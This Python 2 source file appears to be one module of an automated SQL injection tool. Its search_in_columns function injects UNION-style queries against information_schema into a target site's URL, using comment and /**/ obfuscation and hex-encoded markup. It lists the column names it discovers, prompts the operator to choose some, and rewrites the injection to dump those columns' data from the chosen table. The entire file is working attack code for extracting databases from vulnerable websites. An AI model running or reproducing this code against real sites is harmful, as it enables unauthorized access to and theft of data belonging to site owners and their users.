import s_data
from prints import print_data, print_cols_tables
from requests import get_the_page
from response import site_alive


def search_in_columns(site, table, based, database):
    site = site + table + "--" + based
    the_page = get_the_page(site, "2")
    columns_found = s_data.search_for(the_page)
    total_cols = len(columns_found)

    if total_cols:
        print_cols_tables(columns_found, 'Columns Found')
        table = table.decode("hex")
        site = site.replace("information_schema.columns+WHERE+table_name=0x" +
                            table.encode("hex") + "--", database + '.' + table + "--")

        columns = raw_input("Give the columns: ")

        selected_columns = []
        for column in columns_found:
            if column in columns:
                selected_columns.append(column)

        site = site.replace("column_name", "%s,/**/" % selected_columns[0])

        for i in range(1, len(selected_columns)):
            site = site.replace(",/**/,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,",
                                ",0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,%s,/**/,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e," % selected_columns[i])

        site = site.replace(",/**/", '')
        site = site.replace(",0x3e0x0a", ",0x3e,0x0a")
        the_page = get_the_page(site, "2")
        total_data = []
        total_data = s_data.search_for(the_page)

        if not len(total_data):
            print "No data found!"
        else:
            print_data(total_data, selected_columns, table)
